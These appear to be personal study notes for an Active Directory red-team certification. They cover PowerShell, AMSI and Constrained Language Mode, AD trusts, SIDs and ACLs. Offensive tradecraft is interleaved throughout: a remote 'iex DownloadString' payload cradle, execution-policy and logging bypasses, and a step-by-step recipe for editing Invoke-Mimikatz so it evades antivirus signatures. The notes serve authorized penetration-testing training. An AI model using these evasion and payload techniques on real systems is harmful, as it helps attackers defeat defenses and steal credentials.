# PowerShell
- PowerShell is commonly associated with Windows 7 and later versions of the Windows operating system.
- PowerShell is NOT powershell.exe. It is the *System.Management.Automation.dll*
- PowerShell that contains a collection of cmdlets, functions, variables, and other elements that can be reused across multiple scripts or sessions.
- PowerShell Modules are designed to encapsulate and organize specific pieces of functionality in a modular and efficient way.
- PowerShell Extenstion is .psd1 & .psm1
- ```.psd1 "PowerShell Data"```: This extension is used for PowerShell Data files. Specifically, it is commonly used for module manifest files. A module manifest is a metadata file that provides information about a PowerShell module, such as its name, version, author, and dependencies. The .psd1 file is written in a format similar to a hashtable with key-value pairs and is used to define various attributes and settings for the module.
- ```.psm1 "PowerShell Module"```: This extension is used for PowerShell Script Module files. These are script files that contain PowerShell code, including functions and cmdlets, that are part of a module. When you create a module, you can include one or more .psm1 files to define the actual functionality provided by the module. These script module files are typically where you write the code for the module's cmdlets and functions.
- what is mean of ```Cradle```?
It is a method used for executing PowerShell commands or scripts in a way that may bypass security measures and avoid writing scripts or payloads to disk.\
**Example:**\
```iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')```
>"iex" stands for "Invoke-Expression." It is a cmdlet that allows you to run a string as a PowerShell expression or script. The iex cmdlet takes a string as its argument and then interprets and executes the code contained within that string.

**Note:**
> - PowerShell is an interpreted scripting language. It uses an interpreter to process and execute PowerShell scripts and commands. When you run a PowerShell script or enter PowerShell commands in an interactive session, the PowerShell interpreter reads and executes the code line by line or statement by statement.
> - PowerShell scripts are not compiled into machine code before execution. Instead, they are directly interpreted by the PowerShell runtime environment. This allows for flexibility, ease of debugging, and interactive development. However, it can also result in somewhat slower execution compared to compiled languages.
   
**Compiler Vs Interpreter:**
 > 1. Processing Approach:\
      - Compiler: Compilers process the entire source code of a program in one go, translating it into machine code or an intermediate representation before execution. The result is an executable file that can be run independently.\
      - Interpreter: Interpreters process the source code line by line or statement by statement, executing it as they encounter each part of the code.
 > 2. Execution:\
      - Compiler: The code is executed after the compilation process is complete. There is no need to recompile the code each time it runs, which generally results in faster execution.\
      - Interpreter: Code is executed directly, and there is no separate compilation step. This can lead to slower execution as the source code is repeatedly analyzed and executed.
 > 3. Debugging:\
      - Compiler: Debugging can be more challenging, as errors are often detected during or after the compilation process, and it may not be immediately obvious where in the source code the problem exists.\
      - Interpreter: Debugging is often more straightforward, as errors are reported as soon as they are encountered in the code, making it easier to identify the specific location of issues.
 > 4. Portability:\
      - Compiler: Code compiled with one compiler on a specific platform may not be directly executable on a different platform without recompilation.\
      - Interpreter: Interpreted code is often more portable, as long as the interpreter is available for the target platform.
 > 5. Flexibility:\
      - Compiler: Compiled code is generally less flexible because it is already translated into machine code or an intermediate form. Modifications require changes to the source code and recompilation.\
      - Interpreter: Interpreted code is more flexible, as it can be modified and executed interactively without the need for a separate compilation step.
- What is ```COM```?\
COM is a technology that allows different software components to communicate with each other on Windows systems. It's particularly useful for interacting with various system and application components, especially in older Windows environments.

- what is ```iwr```?
is an alias for the Invoke-WebRequest cmdlet. This cmdlet is used to send HTTP and HTTPS requests to web servers and retrieve data from websites. It is particularly useful for tasks like downloading files from the internet, interacting with RESTful APIs, and scraping web content.
- What is ```ADSI```?\
ADSI stands for "Active Directory Service Interfaces." It is a set of COM (Component Object Model) interfaces and objects provided by Microsoft for interacting with various directory services, including Microsoft Active Directory and Lightweight Directory Access Protocol (LDAP) directories. ADSI provides a uniform and consistent way to manage and manipulate directory services in Windows environments.
- Who can Interact with AD using PowerShell?
  - ADSI
  - .NET Classes ```System.DirectoriesServices.ActiveDirectory```
  - Native Executable
  - WMI using PowerShell
  - ActiveDirectory module
> .NET is a free, open-source, cross-platform software framework developed by Microsoft. It provides a rich set of tools and libraries for building and running various types of applications, including desktop, web, mobile, cloud, gaming, and IoT (Internet of Things) applications. .NET is designed to be a versatile and unified platform that allows developers to create software for a wide range of devices and operating systems.
- PowerShell detection? 
  - System wide transcription
  - Script Block logging --> event id 4104
  - AntiMalware Scan Interface (AMSI)
  - Constrained Language Mode (CLM) Integrated with Applocker and WDAC (Device Guard)

 what is AMSI?
  - Integration with Scripting Engines: AMSI integrates with scripting engines like PowerShell, VBScript, and JScript. These scripting engines are commonly used by attackers to run malicious code.
  - Content Scanning: When a script or code is executed, the content is passed through the AMSI interface. AMSI scans the content for suspicious or malicious patterns using signatures, heuristics, and other detection methods.
  - Real-time Protection: AMSI provides real-time protection by scanning scripts and code at runtime, allowing security products to detect and block malicious activities as they occur.

  - Notifications to Security Products: If malicious content is detected, AMSI notifies the registered antivirus or security product, which can then take appropriate actions, such as blocking the execution of the script or code.
  -  Support for Third-Party Security Products: AMSI is not limited to Microsoft's own security products. Third-party antivirus and security software can also leverage the AMSI interface to enhance their ability to detect and prevent malware.

what is the mean of Constrained Language Mode (CLM) Integrated with Applocker and WDAC (Device Guard) ?\
Constrained Language Mode (CLM) is a feature in PowerShell designed to restrict the language elements that can be used in a script. This can help mitigate security risks associated with malicious or unintentional use of certain PowerShell features. When CLM is enforced, it limits the use of language elements that could be abused for malicious purposes.

AppLocker and Windows Defender Application Control (WDAC), formerly known as Device Guard, are additional security features in Windows that work in conjunction with PowerShell's CLM to enhance overall system security.

AppLocker:

- Role: AppLocker is a security feature that helps administrators control which applications and scripts users can run on a Windows system.
- Integration: When CLM is combined with AppLocker, PowerShell scripts can be further restricted based on the rules defined in AppLocker policies. AppLocker policies allow administrators to specify which scripts or applications are allowed to run, preventing the execution of unauthorized or potentially malicious scripts.

Windows Defender Application Control (WDAC) - Device Guard:

- Role: WDAC, also known as Device Guard, is a set of features in Windows that controls which applications and scripts are allowed to run by using code integrity policies.
- Integration: CLM works in conjunction with WDAC to provide additional security. WDAC can enforce code integrity policies that specify which scripts and executables are allowed to run based on cryptographic signatures or other criteria. When WDAC is used in combination with CLM, it adds an extra layer of protection against unauthorized or malicious code execution.
By integrating CLM with AppLocker and WDAC, administrators can implement a multi-layered security approach for PowerShell scripts.

CLM: Restricts the language elements within PowerShell scripts.
AppLocker: Controls which scripts and applications are allowed to run based on defined policies.
WDAC (Device Guard): Enforces code integrity policies to ensure that only trusted and authorized scripts and executables are executed.


***Execution Policy***
>It is NOT a security measure, it is present to prevent user from accidently executing scripts.

Several ways to bypass:-
```
powershell –ExecutionPolicy bypass
powershell –c <cmd>
powershell –encodedcommand
$env:PSExecutionPolicyPreference="bypass"
```
> keep this statement on your mind\
> • There are bypasses and then there are obfuscated bypasses!

***Bypassing PowerShell Security***\
• use Invisi-Shell (https://github.com/OmerYa/Invisi-Shell) for
bypassing the security controls in PowerShell.\
• The tool hooks the .NET assemblies
(System.Management.Automation.dll and System.Core.dll) to bypass
logging\
• It uses a CLR Profiler API to perform the hook.\
• "A common language runtime (CLR) profiler is a dynamic link library
(DLL) that consists of functions that receive messages from, and send
messages to, the CLR by using the profiling API. The profiler DLL is
loaded by the CLR at run time."

***Using Invisi-Shell***\
• With admin privileges:\
```RunWithPathAsAdmin.bat```\
• With non-admin privileges:\
```RunWithRegistryNonAdmin.bat```\
• Type exit from the new PowerShell session to complete the clean-up.

***Bypassing AV Signatures for PowerShell***\
We can always load scripts in memory and avoid detection using AMSI bypass.\
• How do we bypass signature based detection of on-disk PowerShell scripts by Windows Defender?\
• We can use the AMSITrigger (https://github.com/RythmStick/AMSITrigger) tool to identify the exact part of a script that is detected.\
• Simply provide path to the script file to scan it:\
```AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detected.ps1```\
• For full obfuscation of PowerShell scripts, see Invoke-Obfuscation\
(https://github.com/danielbohannon/Invoke-Obfuscation).

***Steps to avoid signature based detection are pretty simple:***
1) Scan using AMSITrigger
2) Modify the detected code snippet
3) Rescan using AMSITrigger
4) Repeat the steps 2 & 3 till we get a result as “AMSI_RESULT_NOT_DETECTED” or “Blank”

***Bypassing AV Signatures for PowerShell - Invoke-Mimikatz***

• Invoke-Mimikatz is THE most heavily signature PowerShell script!\
• We must rename it before scanning with AmsiTrigger or we get an access denied.

There are multiple detections. We need to make the following changes:
1) Remove the comments.
2) Modify each use of "DumpCreds".
3) Modify the variable names of the Win32 API calls that are detected.\
 ```"VirtualProtect", WrtieProcessMemroy" and "CreateRemoteThread"```  
4) Reverse the strings that are detected and the Mimikatz Compressed
DLL string.

***Domain Enumeration***
For enumeration we can use the following tools<br>

− The ActiveDirectory PowerShell module (MS signed and works even in PowerShell CLM)<br>
https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps<br>
https://github.com/samratashok/ADModule<br>
>He maintained it so there is no detection for it

Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll<br>
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1<br>

− BloodHound (C# and PowerShell Collectors)<br>
https://github.com/BloodHoundAD/BloodHound

− PowerView (PowerShell)<br>
https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1<br>
. C:\AD\Tools\PowerView.ps1<br>
>PowerView is a powerful open-source PowerShell tool developed by Will Schroeder (@harmj0y) that is part of the PowerSploit project. PowerSploit is a collection of Microsoft PowerShell modules that can be used for penetration testing, red teaming, and offensive security operations. PowerView, in particular, focuses on Windows Active Directory (AD) enumeration, reconnaissance, and exploitation.<br>

− SharpView (C#) - Doesn't support filtering using Pipeline<br>
https://github.com/tevora-threat/SharpView/<br>

> Very important to check how many times user is signin to know if u enumrate honeybot or real environment
> because normal user is signin many times but the honeybot users didn't because it's a not real users.
***SID vs RID***
```
Security Identifier (SID):

Definition: A SID is a unique alphanumeric identifier that uniquely identifies a security principal (user, group, or computer)
 in a Windows domain or forest.
Structure: SIDs are structured as follows: S-1-5-21-<domain>-<relative identifier>.
Components:
S: Identifies the string as a SID.
1-5-21: The identifier authority for Windows.
<domain>: The domain identifier, unique to each domain or forest.
<relative identifier>: The RID, which uniquely identifies the security principal within the domain.
Relative Identifier (RID):

Definition: The RID is a portion of the SID that uniquely identifies a security principal within a domain. It is a numeric value.
Placement: The RID is the last portion of the SID. For example, in the SID S-1-5-21-<domain>-<relative identifier>,
the <relative identifier> is the RID.
Uniqueness: The combination of the domain SID and RID results in a globally unique identifier for each security principal within
the domain.
Ranges: RIDs are assigned within certain ranges for specific types of security principals (users, groups, computers, etc.).
In summary, the SID is the complete identifier for a security principal and consists of both the domain identifier and the RID.
The RID, on the other hand, is a subset of the SID and represents the unique identifier for the security principal within its domain.
```
***SID Ranges***
```
In Active Directory (AD), Security Identifiers (SIDs) are used to uniquely identify security principals
(such as users, groups, and computers) within a domain or forest. Each SID is composed of a domain identifier
(commonly referred to as the domain SID) and a relative identifier (RID) that is unique within the domain.

For members of a group, including users in AD, the RID portion of the SID is significant. The RID identifies the
user or group within the domain. The RIDs for users are within certain ranges defined by Microsoft. Here are the
common SID ranges for various types of security principals:

User Accounts:

User RIDs typically fall within the range of 1000 to 2147483647 (0x3FFFFFFF).
Group Accounts:

Security groups: 1100 to 2147483647 (0x3FFFFFFF)
Distribution groups: 2000 to 2147483647 (0x3FFFFFFF)
Well-Known SIDs:

Enterprise Admins: 519
Domain Admins: 512
Domain Users: 513
Domain Guests: 514
Domain Computers: 515
Built-in Administrators: 500
Computer Accounts:

RIDs for computer accounts start from 1000.
Built-in Accounts:

Administrator: 500
Guest: 501
krbtgt (Key Distribution Center Service Account): 502
etc.
It's important to note that these RID ranges are defined by Microsoft and are considered well-known. The RIDs, when combined
with the domain SID, create a globally unique identifier for each security principal in the domain.

For example, if you see a SID like S-1-5-21-3623811015-3361044348-30300820-1013, the "1013" portion is the RID for a specific
user or group within the specified domain.
```
***Domain Enumeration - GPO***<br>
- Group Policy provides the ability to manage configuration and changes easily and centrally in AD.<br>
- Allows configuration of 
  - Security settings
  - Registry-based policy settings
  - Group policy preferences like startup/shutdown/log-on/logoff scripts settings
  - Software installation<br>
- GPO can be abused for various attacks like privesc, backdoors, persistence etc.
> u can enumrate just list of group policies and where it apply <br>
> but u can't enumrate what exact settings that apply on the remote macine <br>
> Restricted Groups: a domin group member in local groups, so in case of the local admin is a member of this group
> and you compormised any user there thats mean u have admin permission on this machine.
```
Get GPO(s) which use Restricted Groups or groups.xml for interesting users
Get-DomainGPOLocalGroup
```
```
Group Policy Object (GPO): Restricted Groups settings are configured through Group Policy Objects (GPOs). GPOs define a set
of policies and security settings that can be applied to user and computer objects within an Active Directory domain.

Local Groups: With Restricted Groups, administrators can specify which users or groups should be members of certain local groups
on computers. These local groups include built-in groups like Administrators, Remote Desktop Users, etc.

Group Membership Enforcement: When the GPO is applied to computers, the specified group memberships are enforced. If a computer's
local group membership does not match the settings defined in the GPO, the system will automatically adjust the memberships
during the next Group Policy update.

Security Implications: The use of Restricted Groups is crucial for maintaining a secure and consistent environment. For example,
it helps ensure that only authorized users have administrative privileges on computers.
```
```
ACL, DACL, and SACL are terms related to access control in the context of security and permissions in computer systems,
particularly in the Microsoft Windows operating system.
Here's a brief overview of each:
1-ACL (Access Control List):
-An ACL is a list of permissions associated with an obiect (such as a file, folder, or registry key) that specifies which users
or systemprocesses are granted access and what operations are allowed or denied.
-ACLs are used to control access to resources by specifying the permissions associated with each user or group.
2-DACL (Discretionary Access Control List):
-DACL is a type of ACL that controls access to an object based on the identity of the user or group attempting to access it.
-It is considered discretionary because the owner of the object (or someone with the appropriate privileges) can modify the DACL
to control access at their discretion.
3-SACL (System Access Control List):
-SACL is another type of ACL that controls auditing of object access.
-It is used to log attempts to access an object, helping administrators monitor and audit security events.
-SACLs are often used to track specific types of access, such as read, write, or delete operations, and can be used to 
generate security audit events.
In summary:
-ACL is a general term for a list of permissions associated with an object.
-DACL is a specific tpe of ACL that focuses on discretionary access control, determining who can access an object.
-SACL is a specific type of ACL that focuses on system access control, determining what types of access should 
be audited for an obiect.
```
![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/6c18e37f-12cf-4766-a5c0-4fe3e2bd3d23)

***Domain Enumeration - ACL***<br>
- Enables control on the ability of a process to access objects and other resources in active directory based on:
  - Access Tokens (security context of a process – identity and privs of user)
  - Security Descriptors (SID of the owner, Discretionary ACL (DACL) and System ACL ((SACL))<br>

***Access Control List (ACL)***<br>
- It is a list of Access Control Entries (ACE) – ACE corresponds to individual
permission or audits access. Who has permission and what can be done
on an object?
- Two types:
  - DACL – Defines the permissions trustees (a user or group) have on an object.
  - SACL – Logs success and failure audit messages when an object is accessed.
- ACLs are vital to security architecture of AD.

> for DACL BloodHound is the best choice.<br>
![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/29affaa3-7287-4e07-afe5-6e456a600054)

> ***to understand Security Identifiers***<br>
https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers

***Domain Enumeration - Trusts***
- In an AD environment, trust is a relationship between two domains or
forests which allows users of one domain or forest to access resources in the other domain or forest.
-  Trust can be automatic (parent-child, same forest etc.) or established (forest, external).
- Trusted Domain Objects (TDOs) represent the trust relationships in a domain.

  **Trust Direction**
- One-way trust – Unidirectional. Users in the trusted domain can access resources in the trusting domain but the reverse is not true.
  ![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/3b48e169-3ff1-4287-abd3-e6dc45f9bf94)

  **Trust Direction**
- Two-way trust – Bi-directional. Users of both domains can access resources in the other domain.
![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/733bf801-7287-456c-9535-b6e1da5dbb16)

**Domain Enumeration - Trusts - Transitivity**
- Transitive – Can be extended to establish trust relationships with other domains.<br>
  - All the default intra-forest trust relationships (Treeroot, Parent-Child) between domains within a same forest are transitive two-way trusts.
- Nontransitive – Cannot be extended to other domains in the forest. Can be two-way or oneway.<br>
  - This is the default trust (called external trust) between two domains in different forests when forests do not have a trust relationship. 
![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/6a0ba3fb-385d-4435-8c00-68d3d954d68b)

**Default/Automatic Trusts**
- Parent-child trust
  - It is created automatically between the new domain and the domain that precedes it in the namespace hierarchy, whenever a new domain is added in a
     tree. For example, dollarcorp.moneycorp.local is a child of moneycorp.local
  - This trust is always two-way transitive.
- Tree-root trust
  - It is created automatically between whenever a new domain tree is added to a forest root.
  - This trust is always two-way transitive.
![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/f75cc0ec-47cd-4581-96e3-f7297da6b215)

**External Trusts**
- Between two domains in different forests when forests do not have a trust relationship.
- Can be one-way or twoway and is nontransitive.
![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/f52d592e-f884-488e-a46e-fdfe4cb6448a)

**Forest Trusts**
- Between forest root domain.
- Cannot be extended to a third forest (no implicit trust).
- Can be one-way or two-way and transitive or nontransitive.
![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/d081a147-13ab-476c-baed-8f88992b4819)

>Note:-<br>
>If TrustAtterbutes is WITHIN_FOREST thats mean internal trust<br>
>&<br>
>if TrustAtterbutes is FILTER_SIDS thats mean external trust<br>
